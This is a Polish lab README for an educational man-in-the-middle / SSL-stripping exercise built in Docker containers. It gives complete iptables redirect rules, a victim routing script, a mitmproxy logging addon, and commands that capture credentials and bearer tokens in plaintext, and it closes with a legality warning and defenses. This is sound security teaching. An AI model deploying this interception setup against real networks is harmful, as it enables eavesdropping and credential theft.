# Scenariusz 3: SSL Stripping z HTTP Toolkit

# Instrukcja do zadania oraz polecenia znajduje się w pliku pdf!

## Opis scenariusza

SSL stripping to technika polegająca na usuwaniu szyfrowania HTTPS i konwersji komunikacji na nieszyfrowane HTTP. Atakujący przechwytuje ruch HTTPS i zastępuje go komunikacją z klientem przy użyciu własnego certyfikatu. W tym scenariuszu implementujemy **transparent proxy mode**, gdzie klient nie ma wiedzy o istnieniu proxy.

## Wymagane zasoby

- **System operacyjny**: Linux lub macOS z zainstalowanym Docker i docker-compose
- **Narzędzia**: mitmproxy, iptables, tcpdump
- **Wielkość**: Około 300 MB miejsca na dysku
- **Pamięć RAM**: Minimum 1.5 GB
- **Czas setup**: 10-15 minut
- **Trzy kontenery**: ssl_client (klient), ssl_interceptor (proxy), target_server (serwer)

## Architektura sieciowa

```
┌──────────────────────────────────────────────────────────────┐
│                    Sieć Docker Bridge                        │
│                    (bridge: ssl_network)                     │
│                                                              │
│  ┌──────────────────┐                                        │
│  │  ssl_client      │ (IP: 172.22.0.2)                      │
│  │  (Victim)        │                                        │
│  │  - curl          │ Default gateway: 172.22.0.3           │
│  │  - tcpdump       │                                        │
│  └────────┬─────────┘                                        │
│           │ HTTP/HTTPS traffic (transparent)                │
│           ▼                                                  │
│  ┌──────────────────┐                                        │
│  │ ssl_interceptor  │ (IP: 172.22.0.3)                      │
│  │ (Attacker)       │                                        │
│  │ - mitmproxy      │ iptables: 80/443 -> 8080              │
│  │ - iptables       │ NAT/masquerading enabled              │
│  │ - transparent    │                                        │
│  │   proxy mode     │                                        │
│  └────────┬─────────┘                                        │
│           │ Decrypted/logged traffic                        │
│           ▼                                                  │
│  ┌──────────────────┐                                        │
│  │  target_server   │ (IP: 172.22.0.4)                      │
│  │  - httpbin       │                                        │
│  └──────────────────┘                                        │
│           │                                                  │
│           │ Also: Internet (httpbin.org, etc.)              │
└──────────────────────────────────────────────────────────────┘
```

## Krok 1: Przygotowanie struktury katalogów

```bash
mkdir -p Lab03
cd Lab03
mkdir -p proxy_config proxy_output
```

## Krok 2: Tworzenie Dockerfile dla kontenerów

### Dockerfile dla ssl_client (klient/ofiara)

**Dockerfile.ssl_client**
```dockerfile
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y --no-install-recommends \
    curl \
    tcpdump \
    net-tools \
    iputils-ping \
    iproute2 \
    dnsutils \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /workspace

COPY client_setup.sh /usr/local/bin/client_setup.sh
RUN chmod +x /usr/local/bin/client_setup.sh

CMD ["/usr/local/bin/client_setup.sh"]
```

### Dockerfile dla ssl_interceptor (atakujący)

**Dockerfile.ssl_proxy**
```dockerfile
FROM mitmproxy/mitmproxy:latest

RUN apt-get update && apt-get install -y --no-install-recommends \
    iptables \
    net-tools \
    dnsutils \
    openssl \
    procps \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /proxy
COPY ./proxy_config /proxy/
COPY ./interceptor_setup.sh /usr/local/bin/interceptor_setup.sh

# mitmproxy will auto-generate certificates on first run
RUN mkdir -p /root/.mitmproxy
RUN chmod +x /usr/local/bin/interceptor_setup.sh

CMD ["/bin/bash", "-c", "tail -f /dev/null"]
```

## Krok 3: Tworzenie pliku docker-compose.yml

**docker-compose-scenario3.yml**
```yaml
services:
  ssl_client:
    build:
      context: .
      dockerfile: Dockerfile.ssl_client
    container_name: ssl_client
    networks:
      ssl_network:
        ipv4_address: 172.22.0.2
    cap_add:
      - NET_ADMIN
    stdin_open: true
    tty: true
    depends_on:
      - ssl_interceptor

  ssl_interceptor:
    build:
      context: .
      dockerfile: Dockerfile.ssl_proxy
    container_name: ssl_interceptor
    networks:
      ssl_network:
        ipv4_address: 172.22.0.3
    cap_add:
      - NET_ADMIN
      - SYS_ADMIN
    sysctls:
      - net.ipv4.ip_forward=1
    volumes:
      - ./proxy_output:/proxy/output
    stdin_open: true
    tty: true

  target_server:
    image: kennethreitz/httpbin:latest
    platform: linux/amd64
    container_name: target_server
    networks:
      ssl_network:
        ipv4_address: 172.22.0.4
    expose:
      - "80"

networks:
  ssl_network:
    driver: bridge
    ipam:
      config:
        - subnet: 172.22.0.0/24
```

## Krok 4: Przygotowanie plików konfiguracyjnych

### client_setup.sh (automatyczna konfiguracja routingu klienta)

**client_setup.sh**
```bash
#!/bin/bash
# Setup script for ssl_client to route traffic through interceptor

echo "[INFO] Configuring routing for transparent proxy..."

# Remove default gateway
ip route del default 2>/dev/null || true

# Add interceptor as default gateway
ip route add default via 172.22.0.3

# Verify routing
echo "[INFO] Current routing table:"
ip route

echo "[INFO] Client is now configured to route all traffic through interceptor (172.22.0.3)"
echo "[INFO] All HTTP/HTTPS traffic will be transparently intercepted"

# Keep container running
tail -f /dev/null
```

### interceptor_setup.sh (konfiguracja iptables i NAT)

**interceptor_setup.sh**
```bash
#!/bin/bash
# Setup script for ssl_interceptor to configure transparent proxy

echo "[INFO] Configuring transparent proxy..."

# Verify IP forwarding is enabled
FORWARD=$(cat /proc/sys/net/ipv4/ip_forward)
if [ "$FORWARD" -eq 1 ]; then
    echo "[OK] IP forwarding is enabled"
else
    echo "[ERROR] IP forwarding is not enabled"
    exit 1
fi

# Configure iptables for transparent proxy
echo "[INFO] Setting up iptables rules..."

# Redirect HTTP traffic to mitmproxy
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080

# Redirect HTTPS traffic to mitmproxy
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Enable NAT/masquerading for outbound traffic
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Allow forwarding
iptables -A FORWARD -i eth0 -j ACCEPT

echo "[INFO] iptables rules configured:"
iptables -t nat -L -n -v

echo ""
echo "[INFO] Transparent proxy setup complete!"
echo "[INFO] You can now start mitmproxy with:"
echo "  mitmproxy -m transparent --listen-port 8080 -w /proxy/output/capture.mitm"
echo ""
echo "Or with custom script:"
echo "  mitmproxy -m transparent --listen-port 8080 -s /proxy/ssl_interceptor.py -w /proxy/output/capture.mitm"
```

### proxy_config/ssl_interceptor.py (custom logging script)

**proxy_config/ssl_interceptor.py**
```python
"""
Example mitmproxy script for SSL Stripping demonstration
This script logs all HTTPS requests and responses passing through the proxy
"""

from mitmproxy import http
from datetime import datetime
import json


class SSLInterceptor:
    def __init__(self):
        self.request_count = 0

    def request(self, flow: http.HTTPFlow) -> None:
        """Handle incoming requests"""
        self.request_count += 1

        # Log request details
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"\n[{timestamp}] Request #{self.request_count}")
        print(f"  URL: {flow.request.pretty_url}")
        print(f"  Method: {flow.request.method}")
        print(f"  Host: {flow.request.host}")
        print(f"  Scheme: {flow.request.scheme}")

        # Log headers
        print(f"  Headers:")
        for key, value in flow.request.headers.items():
            print(f"    {key}: {value}")

        # Log POST data if present
        if flow.request.method == "POST":
            try:
                content = flow.request.get_text()
                print(f"  Body: {content[:200]}")  # First 200 chars
            except:
                print(f"  Body: [Binary data]")

    def response(self, flow: http.HTTPFlow) -> None:
        """Handle responses"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"\n[{timestamp}] Response")
        print(f"  URL: {flow.request.pretty_url}")
        print(f"  Status: {flow.response.status_code}")
        print(f"  Content-Type: {flow.response.headers.get('content-type', 'unknown')}")
        print(f"  Content-Length: {len(flow.response.content)} bytes")

        # Optionally modify response
        # Example: Add a header to all responses
        flow.response.headers["X-Intercepted-By"] = "MitM-Lab03"


# Register the addon
addons = [SSLInterceptor()]
```

### proxy_config/.gitkeep

```
# This directory can contain custom mitmproxy scripts and configuration files
```

### proxy_output/.gitkeep

```
# This directory will store captured traffic (.mitm files)
```

## Krok 5: Instrukcje wykonania ataku

### Faza 1: Uruchomienie kontenerów

```bash
# Budowanie i uruchamianie
docker-compose -f docker-compose-scenario3.yml build
docker-compose -f docker-compose-scenario3.yml up -d

# Weryfikacja działania
docker-compose -f docker-compose-scenario3.yml ps
```

Oczekiwany rezultat:
```
NAME              IMAGE                         COMMAND                  SERVICE           CREATED         STATUS         PORTS
ssl_client        lab03-ssl_client              "/usr/local/bin/clie…"   ssl_client        10 seconds ago  Up 9 seconds
ssl_interceptor   lab03-ssl_interceptor         "docker-entrypoint.s…"   ssl_interceptor   10 seconds ago  Up 9 seconds   8080-8081/tcp
target_server     kennethreitz/httpbin:latest   "gunicorn -b 0.0.0.0…"   target_server     10 seconds ago  Up 9 seconds   80/tcp
```

### Faza 2: Konfiguracja środowiska ataku (w ssl_interceptor)

**Terminal 1:**
```bash
# Wejście do kontenera ssl_interceptor
docker exec -it ssl_interceptor bash

# Uruchomienie skryptu konfiguracyjnego
interceptor_setup.sh
```

Oczekiwany rezultat:
```
[INFO] Configuring transparent proxy...
[OK] IP forwarding is enabled
[INFO] Setting up iptables rules...
[INFO] iptables rules configured:
Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
    0     0 REDIRECT   tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 redir ports 8080
    0     0 REDIRECT   tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            tcp dpt:443 redir ports 8080
...
```

### Faza 3: Uruchomienie mitmproxy w transparent mode

**Kontynuacja w Terminal 1 (ssl_interceptor):**
```bash
# Uruchomienie mitmproxy z custom script i zapisywaniem
mitmproxy -m transparent --listen-port 8080 -s /proxy/ssl_interceptor.py -w /proxy/output/capture.mitm
```

Powinien pojawić się interfejs mitmproxy:
```
Flows






















[0/0]   [transparent][scripts:1][W:/proxy/output/capture.mitm]   [*:8080]
```

**WAŻNE:** Pozostaw ten terminal otwarty - będziesz tu obserwować ruch w czasie rzeczywistym.

### Faza 4: Test z klienta (w nowym terminalu)

**Terminal 2:**
```bash
# Wejście do kontenera ssl_client
docker exec -it ssl_client bash

# Weryfikacja routingu (domyślna brama powinna być 172.22.0.3)
ip route

# Test HTTP - UWAGA: bez opcji -x!
curl http://httpbin.org/get

# Test HTTPS - opcja -k ignoruje błędy certyfikatu
curl -k https://httpbin.org/get

# Test POST z danymi wrażliwymi
curl -k -X POST https://httpbin.org/post -d "username=admin&password=supersecret123"

# Test z nagłówkami autoryzacji
curl -k -H "Authorization: Bearer token12345" https://httpbin.org/headers

# Test z lokalnym serwerem
curl http://172.22.0.4/get
```

**Sprawdź Terminal 1** - wszystkie żądania powinny być widoczne w interfejsie mitmproxy!

### Faza 5: Obserwacja ruchu (tcpdump)

**Terminal 3 (opcjonalny):**
```bash
# Wejście do kontenera ssl_client
docker exec -it ssl_client bash

# Uruchomienie tcpdump
tcpdump -i any -A 'tcp port 80 or tcp port 443'
```

**Przełącz się na Terminal 2** i wygeneruj ruch:
```bash
curl http://httpbin.org/get
curl -k https://httpbin.org/get
```

W Terminal 3 zobaczysz:
- Pakiety na portach 80 i 443
- Ruch przechodzący przez 172.22.0.3 (interceptor)
- Dla HTTP: zawartość w ASCII (czytelna)
- Dla HTTPS: zaszyfrowana zawartość

Zatrzymaj tcpdump: `Ctrl+C`

### Faza 6: Analiza przechwyconych danych

**W Terminal 1 (mitmproxy):**
- Naciśnij `q` aby wyjść z mitmproxy
- Potwierdź `y`

To zapisze wszystkie dane do pliku capture.mitm.

**Kontynuacja w Terminal 1 (ssl_interceptor):**
```bash
# Sprawdź rozmiar pliku
ls -lh /proxy/output/capture.mitm

# Odczytaj przechwycone żądania
mitmdump -n -r /proxy/output/capture.mitm

# Szczegółowa analiza z weryfikacją hasła w plaintext
mitmdump -n -r /proxy/output/capture.mitm --flow-detail 3 | grep -B 5 -A 5 "password"

# Eksport do formatu HTTP Archive (HAR)
mitmdump -n -r /proxy/output/capture.mitm --set hardump=/proxy/output/capture.har

# Wyjście z kontenera
exit
```

### Faza 7: Skopiowanie plików na hosta

**Terminal 4 (host):**
```bash
# Skopiuj przechwycone dane na hosta
docker cp ssl_interceptor:/proxy/output/capture.mitm ./proxy_output/
docker cp ssl_interceptor:/proxy/output/capture.har ./proxy_output/

# Weryfikacja
ls -lh ./proxy_output/

# Opcjonalnie: użyj skryptu automatycznej analizy
./analyze_capture.sh
```

## Wskaźniki sukcesu

- Routing w ssl_client pokazuje 172.22.0.3 jako default gateway
- IP forwarding w ssl_interceptor jest włączone (wartość 1)
- Reguły iptables przekierowują porty 80/443 do 8080
- NAT/masquerading jest skonfigurowane
- mitmproxy startuje w trybie transparent
- Ruch HTTP jest przechwytywany BEZ opcji -x w curl
- Ruch HTTPS jest przechwytywany i deszyfrowany
- Dane POST (hasła, tokeny) są widoczne w plaintext w mitmproxy
- Custom logging script wyświetla szczegóły każdego żądania
- Plik capture.mitm zawiera wszystkie przechwycone żądania
- tcpdump pokazuje ruch na portach 80/443
- Eksport do formatu HAR działa poprawnie

## Dodatkowe eksperymenty

### Test z różnymi serwerami docelowymi

```bash
# W ssl_client (bez opcji -x, ruch automatycznie przekierowany)
curl -k https://www.google.com
curl -k https://api.github.com
curl -k https://jsonplaceholder.typicode.com/posts/1
```

### Test z wieloma żądaniami

```bash
# W ssl_client
for i in {1..10}; do
  curl -k -s https://httpbin.org/get?test=$i > /dev/null
  echo "Request $i sent"
done
```

Sprawdź w mitmproxy - wszystkie 10 żądań powinno być przechwyconych.

### Zapisanie tcpdump do pliku

```bash
# W ssl_client
tcpdump -i any -w /tmp/traffic.pcap 'tcp port 80 or tcp port 443' &

# Wygeneruj ruch
curl http://httpbin.org/get
curl -k https://httpbin.org/get

# Zatrzymaj tcpdump
fg
# Ctrl+C

# Analizuj plik
tcpdump -r /tmp/traffic.pcap -A | head -100

# Skopiuj na hosta (opcjonalnie)
exit
docker cp ssl_client:/tmp/traffic.pcap ./proxy_output/
```

## Czyszczenie środowiska

```bash
# Zatrzymaj kontenery
docker-compose -f docker-compose-scenario3.yml down

# Usuń obrazy (opcjonalnie)
docker rmi lab03-ssl_client lab03-ssl_interceptor

# Wyczyść pliki przechwycenia (opcjonalnie)
rm -f proxy_output/capture.mitm proxy_output/capture.har
```

## Rozwiązywanie problemów

### Problem: curl zawiesza się lub timeout

**Rozwiązanie:** Upewnij się, że mitmproxy jest uruchomiony i nasłuchuje na porcie 8080:
```bash
docker exec ssl_interceptor ps aux | grep mitmproxy
docker exec ssl_interceptor netstat -tlnp | grep 8080
```

### Problem: mitmproxy nie wyświetla ruchu

**Rozwiązanie:** Sprawdź konfigurację:
```bash
# 1. Upewnij się, że routing jest poprawnie skonfigurowany w kliencie
docker exec ssl_client ip route
# Powinno pokazać: default via 172.22.0.3 dev eth0

# 2. Sprawdź czy iptables jest skonfigurowany w interceptorze
docker exec ssl_interceptor iptables -t nat -L -n -v | grep 8080

# 3. Jeśli nie, uruchom ponownie skrypt konfiguracyjny
docker exec ssl_interceptor interceptor_setup.sh
```

### Problem: Błędy certyfikatu SSL w kliencie

**Rozwiązanie:** Użyj opcji `-k` w curl aby zignorować błędy certyfikatu:
```bash
curl -k https://httpbin.org/get
```

**Wyjaśnienie:** mitmproxy używa własnego certyfikatu CA do szyfrowania ruchu między klientem a proxy. Opcja `-k` pozwala curl zaakceptować ten certyfikat mimo że nie jest zaufany.

### Problem: Plik capture.mitm jest pusty

**Rozwiązanie:**
1. Upewnij się, że wysłałeś ruch przez proxy
2. Zatrzymaj mitmproxy (naciśnij `q`) aby zapisać bufor do pliku
3. Sprawdź rozmiar pliku: `ls -lh /proxy/output/capture.mitm`

### Problem: Brak połączenia między kontenerami

**Rozwiązanie:** Sprawdź czy kontenery są w tej samej sieci:
```bash
docker network inspect lab03_ssl_network
```

## Notatki dotyczące bezpieczeństwa

Ten scenariusz jest przeznaczony **wyłącznie do celów edukacyjnych** i powinien być używany tylko w izolowanym środowisku testowym. SSL stripping jest nielegalny bez odpowiedniego upoważnienia.

### Dlaczego ten atak działa?

1. **Transparent proxy:** Klient nie wie o istnieniu proxy (żadna konfiguracja nie jest potrzebna)
2. **Routing:** Cały ruch jest przekierowywany przez interceptor jako default gateway
3. **iptables:** Automatyczne przekierowanie portów 80/443 do mitmproxy
4. **Podmiana certyfikatu:** mitmproxy generuje własne certyfikaty on-the-fly
5. **Deszyfrowanie:** HTTPS jest deszyfrowane między klientem a proxy, następnie ponownie szyfrowane między proxy a serwerem

## Mechanizmy obrony

- **HSTS (HTTP Strict Transport Security):** Wymusza HTTPS i zapobiega downgrade attack
- **Certificate Pinning:** Uniemożliwia podmianę certyfikatów przez sprawdzanie konkretnego certyfikatu
- **Certificate Transparency:** Publiczne logowanie wydanych certyfikatów, umożliwia wykrycie fałszywych
- **Edukacja użytkowników:** Uczenie rozpoznawania ostrzeżeń o certyfikatach
- **VPN:** Szyfrowanie całego ruchu na poziomie sieciowym
- **Encrypted DNS (DoH/DoT):** Zapobiega manipulacji DNS

## Struktura plików końcowa

```
Lab03/
├── Dockerfile.ssl_client              # Dockerfile dla klienta
├── Dockerfile.ssl_proxy               # Dockerfile dla interceptora
├── docker-compose-scenario3.yml       # Konfiguracja Docker Compose
├── client_setup.sh                    # Skrypt konfiguracji routingu klienta
├── interceptor_setup.sh               # Skrypt konfiguracji iptables
├── analyze_capture.sh                 # Skrypt automatycznej analizy
├── proxy_config/                      # Konfiguracja mitmproxy
│   ├── .gitkeep
│   └── ssl_interceptor.py            # Custom logging script
├── proxy_output/                      # Przechwycone dane
│   ├── .gitkeep
│   ├── capture.mitm                  # Plik przechwycenia (po testach)
│   └── capture.har                   # Eksport HAR (po analizie)
├── README.md                          # Ten plik
├── TESTING_GUIDE.md                   # Szczegółowy przewodnik testowania
├── COMMANDS.md                        # Lista wszystkich komend
├── QUICK_START.md                     # Szybki start
└── SUMMARY.md                         # Podsumowanie implementacji
```

## Co zostało zademonstrowane?

Po ukończeniu wszystkich testów udało się zademonstrować:

1. **Transparent Proxy:** Klient nie wie o przechwytywaniu
2. **SSL/TLS Interception:** Ruch HTTPS jest deszyfrowany
3. **Credential Theft:** Hasła przechwycone w plaintext
4. **Network-level Attack:** Przekierowanie oparte na iptables
5. **Traffic Analysis:** Pełne przechwytywanie i analiza pakietów
6. **Man-in-the-Middle:** Kompletny łańcuch ataku

To pokazuje dlaczego:
- Sam HTTPS nie wystarczy (walidacja certyfikatów ma znaczenie!)
- Certificate pinning jest ważny
- Użytkownicy muszą zwracać uwagę na ostrzeżenia o certyfikatach
- VPN i szyfrowane DNS zapewniają dodatkową ochronę
